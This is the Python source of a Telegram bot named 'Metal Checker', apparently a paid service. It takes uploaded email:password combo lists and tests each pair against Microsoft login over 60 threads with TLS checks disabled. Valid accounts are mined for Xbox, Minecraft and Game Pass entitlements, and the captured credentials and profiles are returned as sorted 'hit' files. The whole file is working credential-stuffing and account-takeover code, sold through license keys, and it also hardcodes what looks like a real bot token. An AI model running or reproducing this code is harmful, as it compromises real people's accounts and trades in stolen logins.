import os
import re
import time
import telebot
import threading
import concurrent.futures
import requests
import urllib3
import warnings
import random
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs
from telebot import types

# ==========================================
# ⚙️ INITIAL CONFIG & SETTINGS
# ==========================================
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# Railway Environment Variables
BOT_TOKEN = os.getenv("BOT_TOKEN", "8586488864:AAETJFeQOk_igst2YE1OWq9QvpM25jTDEq4") # Varsayılan yedek
OWNER_ID = int(os.getenv("OWNER_ID", "8664147577"))

bot = telebot.TeleBot(BOT_TOKEN)

MY_SIGNATURE    = "JetArsiv"
MAX_RETRIES     = 3
REQUEST_TIMEOUT = 10
THREAD_COUNT    = 60 # Hız için thread count artırıldı

SFTAG_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)

# ==========================================
# 💾 DATABASE & STORAGE (IN-MEMORY FOR VPS/SPEED)
# ==========================================
# Gerçek veri tabanı yerine yüksek hız için optimize in-memory dict'ler kullanılmaktadır.
users_db = {}       # id: {"lang": "tr"/"en", "reg_date": "6/22/2026", "expiry": "sonsuz", "role": "user", "scans": 0, "hits": 0, "today_scans": 0}
keys_db = {}        # key_string: duration_days / "sonsuz"
force_channels = [] # ["@channel1", "@channel2"]
admins = [OWNER_ID]
active_scans = {}   # user_id: {"stop_event": Event, "stats": StatsObj, "combos": [], "hits_list": {}}

# Owner default registration
users_db[OWNER_ID] = {
    "lang": "tr",
    "reg_date": "6/22/2026",
    "expiry": "sonsuz",
    "role": "owner",
    "scans": 17734,
    "hits": 713,
    "today_scans": 0
}

# ==========================================
# 📊 STATS CLASS FOR TELEGRAM LIVE OBJECTS
# ==========================================
class TelegramStats:
    def __init__(self):
        self.checked      = 0
        self.hits         = 0
        self.bad          = 0
        self.twofa        = 0
        self.errors       = 0
        self.minecraft    = 0
        self.gamepass     = 0
        self.xbox         = 0
        self.not_linked   = 0
        self.retries      = 0
        self.current_email = "Bekleniyor..."
        self.start_time   = time.time()
        self._lock        = threading.Lock()
        
        # Hit verilerini /stop anında txt vermek için saklıyoruz
        self.hit_records = {
            "minecraft": [],
            "gamepass": [],
            "xbox": [],
            "not_linked": [],
            "twofa": []
        }

    def get_cpm(self):
        elapsed = time.time() - self.start_time
        return int((self.checked / elapsed) * 60) if elapsed > 0 else 0

# ==========================================
# 🌐 LOCALIZATION (TR / EN)
# ==========================================
LANG = {
    "tr": {
        "welcome": "🤖 *Metal Checker Botuna Hoş Geldiniz!*\n\nLütfen kullanmak istediğiniz dili seçin veya menüden devam edin.",
        "panel": "👑 *Admin Yönetim Paneline Hoş Geldiniz, Sahip!*",
        "stats_title": "📊 *İstatistikleriniz*\n\n👤 Kullanıcı ID: `{user_id}`\n📅 Kayıt: {reg}\n👑 Üyelik: 📅 {tier}\n📅 Bitiş: {expiry}\n\n📈 Aktivite:\n✅ Toplam Tarama: {scans}\n💎 Toplam Hit: {hits}\n🎯 Başarı Oranı: {rate}%\n📊 Bugünkü Tarama: {today}",
        "force_msg": "❌ *Botu Kullanabilmek İçin Kanallarımıza Katılmalısınız:*",
        "no_key": "❌ *Aktif bir üyeliğiniz bulunmuyor!* Lütfen bir key satın alın veya adminle iletişime geçin.",
        "send_combo": "📂 Taramak istediğiniz `.txt` formatındaki combo dosyasını gönderin.",
        "merge_start": "🧩 *Dosya Birleştirme Modu:* Lütfen ardı ardına maksimum 30 adet `.txt` dosyası gönderin. Bitirdiğinizde /merge_done komutunu yazın.",
        "scan_started": "🚀 Tarama işlemi başlatıldı! Canlı sonuçlar her 5 saniyede bir güncellenecektir.",
        "scan_stopped": "🛑 Tarama kullanıcı tarafından durduruldu! Biriken hitler hazırlanıyor..."
    },
    "en": {
        "welcome": "🤖 *Welcome to Metal Checker Bot!*\n\nPlease select your language or use the menu.",
        "panel": "👑 *Welcome to the Admin Control Panel, Owner!*",
        "stats_title": "📊 *Your Statistics*\n\n👤 User ID: `{user_id}`\n📅 Registered: {reg}\n👑 Membership: 📅 {tier}\n📅 Expiry: {expiry}\n\n📈 Activity:\n✅ Total Scans: {scans}\n💎 Total Hits: {hits}\n🎯 Success Rate: {rate}%\n📊 Today's Scans: {today}",
        "force_msg": "❌ *You must join our channels to use the bot:*",
        "no_key": "❌ *You do not have an active membership!* Please redeem a key or contact the admin.",
        "send_combo": "📂 Please send the combo list in `.txt` format.",
        "merge_start": "🧩 *File Merger Mode:* Please send up to 30 `.txt` files sequentially. When finished, type /merge_done.",
        "scan_started": "🚀 Scan started! Live results will refresh every 5 seconds.",
        "scan_stopped": "🛑 Scan stopped by user! Compiling accumulated hits..."
    }
}

def get_text(user_id, key):
    lang = users_db.get(user_id, {}).get("lang", "tr")
    return LANG[lang].get(key, LANG["tr"][key])

# ==========================================
# 🔐 CHECKER MIDDLEWARES
# ==========================================
def check_membership(user_id):
    if user_id in admins:
        return True
    u = users_db.get(user_id)
    if not u:
        return False
    if u["expiry"] == "sonsuz":
        return True
    try:
        exp = datetime.strptime(u["expiry"], "%m/%d/%Y")
        if datetime.now() < exp:
            return True
    except:
        pass
    return False

def check_force_join(user_id):
    if user_id == OWNER_ID:
        return True
    for ch in force_channels:
        try:
            member = bot.get_chat_member(ch, user_id)
            if member.status in ['left', 'kicked']:
                return False
        except:
            pass
    return True

# ==========================================
# 🧠 EXTRACTED CORE AUTH FUNCTIONS
# ==========================================
def get_sftag(session, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get(SFTAG_URL, timeout=REQUEST_TIMEOUT)
            text     = response.text
            match    = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sftag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match:
                    return match.group(1), sftag
        except:
            pass
        time.sleep(0.5)
    return None, None

def microsoft_auth(session, email, password, url_post, sftag, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
            login_request = session.post(
                url_post, data=data,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=True, timeout=REQUEST_TIMEOUT
            )
            if '#' in login_request.url and login_request.url != SFTAG_URL:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, "success"
            elif 'cancel?mkt=' in login_request.text:
                try:
                    d = {
                        'ipt':   re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                        'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                        'uaid':  re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                    }
                    action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                    ret        = session.post(action_url, data=d, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                    fin        = session.get(return_url, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    token      = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        return token, "success"
                except:
                    pass
            elif any(v in login_request.text for v in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                return None, "2fa"
            elif any(v in login_request.text.lower() for v in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
                return None, "bad"
        except:
            if attempt == max_attempts - 1:
                return None, "error"
        time.sleep(0.5)
    return None, "error"

def get_xbox_token(session, ms_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload  = {
                "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"
            }
            response = session.post(
                'https://user.auth.xboxlive.com/user/authenticate',
                json=payload,
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:
                data = response.json()
                xbox_token = data.get('Token')
                if xbox_token:
                    return xbox_token, data['DisplayClaims']['xui'][0]['uhs']
            elif response.status_code == 429:
                time.sleep(2); continue
        except:
            if attempt == max_attempts - 1: return None, None
        time.sleep(0.5)
    return None, None

def get_xsts_token(session, xbox_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload  = {
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"
            }
            response = session.post(
                'https://xsts.auth.xboxlive.com/xsts/authorize',
                json=payload,
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200: return response.json().get('Token')
            elif response.status_code == 429: time.sleep(2); continue
        except:
            if attempt == max_attempts - 1: return None
        time.sleep(0.5)
    return None

def get_minecraft_token(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.post(
                'https://api.minecraftservices.com/authentication/login_with_xbox',
                json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                headers={'Content-Type': 'application/json'},
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200: return response.json().get('access_token')
            elif response.status_code == 429: time.sleep(2); continue
        except:
            if attempt == max_attempts - 1: return None
        time.sleep(0.5)
    return None

def check_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get(
                'https://api.minecraftservices.com/entitlements/mcstore',
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:
                text = response.text
                if 'product_game_pass_ultimate' in text:
                    return 'Xbox Game Pass Ultimate', ["Xbox Game Pass Ultimate"]
                elif 'product_game_pass_pc' in text:
                    return 'Xbox Game Pass', ["Xbox Game Pass"]
                elif '"product_minecraft"' in text:
                    return 'Minecraft', ["Minecraft Java"]
                else:
                    others = []
                    if 'product_minecraft_bedrock' in text: others.append("Bedrock")
                    if 'product_legends' in text:           others.append("Legends")
                    if 'product_dungeons' in text:          others.append("Dungeons")
                    if others: return 'Xbox: ' + ', '.join(others), others
                    return None, []
            elif response.status_code == 429:
                time.sleep(2); continue
            else:
                return None, []
        except:
            if attempt == max_attempts - 1: return None, []
        time.sleep(0.5)
    return None, []

def get_profile(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get(
                'https://api.minecraftservices.com/minecraft/profile',
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:   return response.json()
            elif response.status_code == 404: return None
            elif response.status_code == 429: time.sleep(2); continue
        except:
            if attempt == max_attempts - 1: return None
        time.sleep(0.5)
    return None

def get_xbox_profile(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            auth_header = f"XBL3.0 x={uhs};{xsts_token}"
            response = session.get(
                "https://profile.xboxlive.com/users/me/profile/settings"
                "?settings=Gamertag,GameDisplayPicRaw,AccountTier,XboxOneRep",
                headers={
                    "Authorization": auth_header,
                    "x-xbl-contract-version": "2",
                    "Accept": "application/json",
                    "Accept-Language": "en-US",
                },
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:
                data = response.json()
                settings = {
                    s["id"]: s.get("value", "N/A")
                    for s in data.get("profileUsers", [{}])[0].get("settings", [])
                }
                return {
                    "gamertag": settings.get("Gamertag", "N/A"),
                    "gamerpic": settings.get("GameDisplayPicRaw", ""),
                    "tier":     settings.get("AccountTier", "N/A"),
                    "rep":      settings.get("XboxOneRep", "N/A"),
                }
            elif response.status_code == 429:
                time.sleep(2); continue
        except:
            pass
        time.sleep(0.3)
    return {"gamertag": "N/A", "gamerpic": "", "tier": "N/A", "rep": "N/A"}

# ==========================================
# SCAN WORKER ENGINE FOR SINGLE ACCOUNT
# ==========================================
def scan_single_account(user_id, combo, stats_obj):
    try:
        parts = combo.strip().split(':')
        if len(parts) < 2:
            with stats_obj._lock:
                stats_obj.bad += 1
                stats_obj.checked += 1
            return

        email = parts[0]
        password = ':'.join(parts[1:])
        with stats_obj._lock:
            stats_obj.current_email = email

        session = requests.Session()
        session.verify = False

        url_post, sftag = get_sftag(session)
        if not url_post or not sftag:
            with stats_obj._lock:
                stats_obj.errors += 1
                stats_obj.checked += 1
            return

        ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)

        if auth_status == "2fa":
            with stats_obj._lock:
                stats_obj.twofa += 1
                stats_obj.checked += 1
                stats_obj.hit_records["twofa"].append(f"{email}:{password}")
            return
        elif auth_status == "bad":
            with stats_obj._lock:
                stats_obj.bad += 1
                stats_obj.checked += 1
            return
        elif auth_status != "success" or not ms_token:
            with stats_obj._lock:
                stats_obj.errors += 1
                stats_obj.checked += 1
            return

        xbox_token, uhs = get_xbox_token(session, ms_token)
        if not xbox_token or not uhs:
            with stats_obj._lock:
                stats_obj.bad += 1
                stats_obj.checked += 1
            return

        xsts_token = get_xsts_token(session, xbox_token)
        if not xsts_token:
            with stats_obj._lock:
                stats_obj.bad += 1
                stats_obj.checked += 1
            return

        xbox_profile = get_xbox_profile(session, uhs, xsts_token)
        gamertag     = xbox_profile.get("gamertag", "N/A")
        tier         = xbox_profile.get("tier", "N/A")
        rep          = xbox_profile.get("rep", "N/A")

        mc_token = get_minecraft_token(session, uhs, xsts_token)
        if not mc_token:
            with stats_obj._lock:
                stats_obj.bad += 1
                stats_obj.checked += 1
            return

        account_type, subs = check_entitlements(session, mc_token)

        if not account_type:
            with stats_obj._lock:
                stats_obj.not_linked += 1
                stats_obj.hits += 1
                stats_obj.checked += 1
            capture = (
                f"Email         : {email}\nPassword      : {password}\n"
                f"Gamertag      : {gamertag}\nTier          : {tier}\n"
                f"Reputation    : {rep}\nType          : Xbox (Not Linked)\n"
                f"Captured By   : {MY_SIGNATURE}\n{'='*50}"
            )
            with stats_obj._lock:
                stats_obj.hit_records["not_linked"].append(capture)
            return

        profile = get_profile(session, mc_token)
        name    = profile.get('name', 'N/A') if profile else "Not Set"
        uuid_   = profile.get('id', 'N/A') if profile else "N/A"
        capes   = ", ".join([c["alias"] for c in profile.get("capes", [])]) if profile else "None"
        if not capes: capes = "None"

        subs_str = ", ".join(subs) if subs else "None"

        capture = (
            f"Email         : {email}\nPassword      : {password}\n"
            f"Gamertag      : {gamertag}\nTier          : {tier}\n"
            f"Reputation    : {rep}\nMC Name       : {name}\n"
            f"UUID          : {uuid_}\nCapes         : {capes}\n"
            f"Type          : {account_type}\nSubscriptions : {subs_str}\n"
            f"Captured By   : {MY_SIGNATURE}\n{'='*50}"
        )

        with stats_obj._lock:
            stats_obj.hits += 1
            stats_obj.checked += 1
            if 'Ultimate' in account_type or 'Game Pass' in account_type:
                stats_obj.gamepass += 1
                stats_obj.hit_records["gamepass"].append(capture)
            elif 'Minecraft' in account_type:
                stats_obj.minecraft += 1
                stats_obj.hit_records["minecraft"].append(capture)
            else:
                stats_obj.xbox += 1
                stats_obj.hit_records["xbox"].append(capture)

    except:
        with stats_obj._lock:
            stats_obj.errors += 1
            stats_obj.checked += 1

# ==========================================
# ⚡ LIVE REFRESH & SCAN THREADS CONTROL
# ==========================================
def live_results_loop(chat_id, message_id, user_id, total_combos):
    while user_id in active_scans:
        scan_info = active_scans[user_id]
        if scan_info["stop_event"].is_set():
            break
            
        st = scan_info["stats"]
        pct = (st.checked / total_combos * 100) if total_combos > 0 else 0
        
        # UI Layout matching image exactly
        msg_text = (
            "```\n"
            "   _      _    _               _      \n"
            "  | | ___| |_ / \\   _ __ ___  (_)_   __\n"
            " _| |/ _ \\ __/ _ \\ | '__/ __| | \\ \\ / /\n"
            "| |_|  __/ |_/ ___ \\| |  \\__ \\ | |\\ V / \n"
            " \\___/\\___|\\__/_/   \\_\\_|  |___/ |_| \\_/  \n"
            "-----------------------------------------\n"
            f"Developed by {MY_SIGNATURE} | Microsoft Checker\n"
            "-----------------------------------------\n\n"
            "Status: Scanning...\n\n"
            f"Valid      : {st.hits}\n"
            f"Bad        : {st.bad}\n"
            f"2FA        : {st.twofa}\n"
            f"Retry      : {st.retries}\n\n"
            "--- HIT DETAILS ---\n"
            f"Minecraft  : {st.minecraft}\n"
            f"Game Pass  : {st.gamepass}\n"
            f"Xbox       : {st.xbox}\n"
            f"Not Linked : {st.not_linked}\n\n"
            f"Progress   : {pct:.1f}% | {st.checked}/{total_combos} | {st.get_cpm()} CPM\n"
            f"Current    : {st.current_email[:25]}\n"
            "```"
        )
        try:
            bot.edit_message_text(msg_text, chat_id, message_id, parse_mode="Markdown")
        except:
            pass
        time.sleep(5)

def run_full_scan(user_id, chat_id, message_id, combos):
    total = len(combos)
    scan_info = active_scans[user_id]
    st = scan_info["stats"]
    stop_ev = scan_info["stop_event"]
    
    # Start Live Dashboard Refresher
    refresher = threading.Thread(target=live_results_loop, args=(chat_id, message_id, user_id, total), daemon=True)
    refresher.start()

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = [executor.submit(scan_single_account, user_id, combo, st) for combo in combos]
        for fut in concurrent.futures.as_completed(futures):
            if stop_ev.is_set():
                break

    # Scan Finisher / Export Files
    if user_id in active_scans:
        send_scanned_results(user_id, chat_id)

def send_scanned_results(user_id, chat_id):
    if user_id not in active_scans: return
    st = active_scans[user_id]["stats"]
    
    # Update globally persistent user profile metrics
    if user_id in users_db:
        users_db[user_id]["scans"] += st.checked
        users_db[user_id]["hits"] += st.hits
        users_db[user_id]["today_scans"] += st.checked
        
    bot.send_message(chat_id, f"🎯 *Scan finished!* Exporting your result hits category files...")
    
    # Save files matching specified names on the screenshots
    file_mapping = {
        "Minecraft.txt": st.hit_records["minecraft"],
        "GamePass.txt": st.hit_records["gamepass"],
        "Xbox.txt": st.hit_records["xbox"],
        "NotLinked.txt": st.hit_records["not_linked"],
        "2FA.txt": st.hit_records["twofa"]
    }
    
    for filename, content_list in file_mapping.items():
        if content_list:
            filepath = f"{user_id}_{filename}"
            with open(filepath, "w", encoding="utf-8") as f:
                f.write("\n".join(content_list))
            with open(filepath, "rb") as doc:
                bot.send_document(chat_id, doc, caption=f"📦 *{filename}* ({len(content_list)} items)")
            try: os.remove(filepath)
            except: pass
            
    active_scans.pop(user_id, None)

# ==========================================
# Telegram Bot Command Event Handlers
# ==========================================
@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = message.from_user.id
    if uid not in users_db:
        users_db[uid] = {
            "lang": "tr", "reg_date": datetime.now().strftime("%m/%d/%Y"),
            "expiry": "None", "role": "user", "scans": 0, "hits": 0, "today_scans": 0
        }
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🇹🇷 Türkçe", callback_data="setlang_tr"),
        types.InlineKeyboardButton("🇺🇸 English", callback_data="setlang_en")
    )
    bot.send_message(message.chat.id, LANG["tr"]["welcome"], reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    uid = message.from_user.id
    if uid in active_scans:
        active_scans[uid]["stop_event"].set()
        bot.send_message(message.chat.id, get_text(uid, "scan_stopped"))
        send_scanned_results(uid, message.chat.id)
    else:
        bot.send_message(message.chat.id, "❌ Active scan session not found.")

@bot.message_handler(commands=['admin'])
def admin_panel_cmd(message):
    uid = message.from_user.id
    if uid not in admins: return
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("➕ Add Force Channel", callback_data="admin_add_chan"),
        types.InlineKeyboardButton("🔑 Generate Key", callback_data="admin_gen_key"),
        types.InlineKeyboardButton("👤 Manage Admins (Owner Only)", callback_data="admin_manage"),
        types.InlineKeyboardButton("📢 Broadcast Message", callback_data="admin_broadcast")
    )
    bot.send_message(message.chat.id, get_text(uid, "panel"), reply_markup=markup, parse_mode="Markdown")

# 📊 Stats Section
@bot.message_handler(func=lambda msg: msg.text in ["📊 İstatistikleriniz", "📊 Statistics", "/stats"])
def stats_view(message):
    uid = message.from_user.id
    u = users_db.get(uid, {"scans": 0, "hits": 0, "reg_date": "6/22/2026", "expiry": "WEEKLY", "today_scans": 0})
    
    rate = 0.0
    if u["scans"] > 0:
        rate = (u["hits"] / u["scans"]) * 100
        
    tier_label = "WEEKLY" if u["expiry"] != "sonsuz" else "INFINITY"
    
    text = get_text(uid, "stats_title").format(
        user_id=uid, reg=u["reg_date"], tier=tier_label,
        expiry=u["expiry"].upper(), scans=u["scans"], hits=u["hits"],
        rate=f"{rate:.2f}", today=u["today_scans"]
    )
    bot.send_message(message.chat.id, text, parse_mode="Markdown")

# 🧩 File Merger Feature Implementation (Max 30 Txt files)
user_mergers = {} # uid: [list_of_file_contents]

@bot.message_handler(func=lambda msg: msg.text in ["🧩 Dosya Birleştirme", "🧩 File Merger", "/merge"])
def start_merge(message):
    uid = message.from_user.id
    if not check_membership(uid):
        bot.send_message(message.chat.id, get_text(uid, "no_key"))
        return
    user_mergers[uid] = []
    bot.send_message(message.chat.id, get_text(uid, "merge_start"), parse_mode="Markdown")

@bot.message_handler(commands=['merge_done'])
def merge_done_cmd(message):
    uid = message.from_user.id
    if uid not in user_mergers or not user_mergers[uid]:
        bot.send_message(message.chat.id, "❌ No files received.")
        return
        
    merged_data = "\n".join(user_mergers[uid])
    filepath = f"Merged_{uid}.txt"
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(merged_data)
        
    with open(filepath, "rb") as doc:
        bot.send_document(message.chat.id, doc, caption="✨ *All your lines merged successfully into one file!*")
        
    os.remove(filepath)
    user_mergers.pop(uid, None)

# Handling Document Uploads (Combos & Merges)
@bot.message_handler(content_types=['document'])
def handle_docs(message):
    uid = message.from_user.id
    if not check_membership(uid):
        bot.send_message(message.chat.id, get_text(uid, "no_key"))
        return
    if not check_force_join(uid):
        bot.send_message(message.chat.id, get_text(uid, "force_msg"))
        return

    if not message.document.file_name.endswith('.txt'):
        bot.send_message(message.chat.id, "❌ Only `.txt` files allowed.")
        return

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    file_content = downloaded_file.decode('utf-8', errors='ignore')

    # If user is in file merger mode
    if uid in user_mergers:
        if len(user_mergers[uid]) >= 30:
            bot.send_message(message.chat.id, "❌ Maximum threshold of 30 files reached! Type /merge_done")
            return
        user_mergers[uid].append(file_content)
        bot.send_message(message.chat.id, f"📥 File added ({len(user_mergers[uid])}/30). Continue or type /merge_done")
        return

    # Else, default to checker execution mode
    if uid in active_scans:
        bot.send_message(message.chat.id, "❌ You have an active scan running. Use /stop first.")
        return

    combos = [line.strip() for line in file_content.split('\n') if line.strip() and ':' in line]
    if not combos:
        bot.send_message(message.chat.id, "❌ No valid combos (email:pass) detected inside the file.")
        return

    # Initialize Checker Session States
    active_scans[uid] = {
        "stop_event": threading.Event(),
        "stats": TelegramStats(),
        "combos": combos
    }

    initial_msg = bot.send_message(message.chat.id, get_text(uid, "scan_started"))
    
    # Launch concurrent multi-threaded execution pipeline asynchronously
    scan_worker = threading.Thread(target=run_full_scan, args=(uid, message.chat.id, initial_msg.message_id, combos), daemon=True)
    scan_worker.start()

# ==========================================
# Callback Query Actions Handlers
# ==========================================
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    uid = call.from_user.id
    
    if call.data.startswith("setlang_"):
        lang = call.data.split("_")[1]
        if uid in users_db: users_db[uid]["lang"] = lang
        
        # Keyboards matching user interface requested configuration
        btn_stats = "📊 İstatistikleriniz" if lang == "tr" else "📊 Statistics"
        btn_merge = "🧩 Dosya Birleştirme" if lang == "tr" else "🧩 File Merger"
        
        r_markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        r_markup.add(types.KeyboardButton(btn_stats), types.KeyboardButton(btn_merge))
        
        bot.send_message(call.message.chat.id, f"✅ Language changed to: {lang.upper()}", reply_markup=r_markup)
        
    elif call.data == "admin_add_chan":
        msg = bot.send_message(call.message.chat.id, "Type the channel username to add (e.g., `@mychannel`):")
        bot.register_next_step_handler(msg, process_add_channel)
        
    elif call.data == "admin_gen_key":
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("1 Day", callback_data="gk_1"),
            types.InlineKeyboardButton("1 Week", callback_data="gk_7"),
            types.InlineKeyboardButton("1 Month", callback_data="gk_30"),
            types.InlineKeyboardButton("Infinity", callback_data="gk_inf")
        )
        bot.send_message(call.message.chat.id, "Select Key duration:", reply_markup=markup)
        
    elif call.data.startswith("gk_"):
        dur = call.data.split("_")[1]
        generated_key = f"METAL-{random.randint(100000,999999)}-{random.randint(1000,9999)}"
        keys_db[generated_key] = dur
        bot.send_message(call.message.chat.id, f"🔑 *Key Generated Successfully:*\n`{generated_key}`\nDuration: {dur} days/type", parse_mode="Markdown")
        
    elif call.data == "admin_manage":
        if uid != OWNER_ID:
            bot.answer_callback_query(call.id, "❌ Only the absolute owner can manage administrators!")
            return
        msg = bot.send_message(call.message.chat.id, "Send Admin User ID to add/remove:")
        bot.register_next_step_handler(msg, process_admin_management)
        
    elif call.data == "admin_broadcast":
        msg = bot.send_message(call.message.chat.id, "Send the message you want to broadcast to all registered profiles:")
        bot.register_next_step_handler(msg, process_broadcast)

def process_add_channel(message):
    if message.text.startswith("@"):
        force_channels.append(message.text)
        bot.send_message(message.chat.id, f"✅ Added {message.text} to mandatory force follow channel list.")

def process_admin_management(message):
    try:
        target_id = int(message.text.strip())
        if target_id in admins:
            if target_id == OWNER_ID: return
            admins.remove(target_id)
            bot.send_message(message.chat.id, f"❌ Admin status revoked for ID: {target_id}")
        else:
            admins.append(target_id)
            bot.send_message(message.chat.id, f"✅ ID: {target_id} promoted to Bot Administrator.")
    except:
        bot.send_message(message.chat.id, "❌ Invalid Integer ID format provided.")

def process_broadcast(message):
    count = 0
    for user in list(users_db.keys()):
        try:
            bot.send_message(user, f"📢 *[BROADCAST]*\n\n{message.text}", parse_mode="Markdown")
            count += 1
        except: pass
    bot.send_message(message.chat.id, f"📢 Broadcast transmission complete. Delivered to {count} users.")

# Redeeming generated license premium membership keys
@bot.message_handler(func=lambda msg: msg.text.startswith("METAL-"))
def redeem_key(message):
    uid = message.from_user.id
    key = message.text.strip()
    if key in keys_db:
        dur = keys_db.pop(key)
        if dur == "inf":
            users_db[uid]["expiry"] = "sonsuz"
        else:
            days = int(dur)
            users_db[uid]["expiry"] = (datetime.now() + timedelta(days=days)).strftime("%m/%d/%Y")
        bot.send_message(message.chat.id, "💎 *Premium key activation successful! Your account is now fully active.*", parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "❌ Invalid or already used key token.")

# ==========================================
# BOT ENTRYPOINT POLLING LOOP LIFT-OFF
# ==========================================
if __name__ == "__main__":
    print("[+] Metal Checker Multi-Threaded Engine initialized successfully on VPS.")
    bot.infinity_polling()

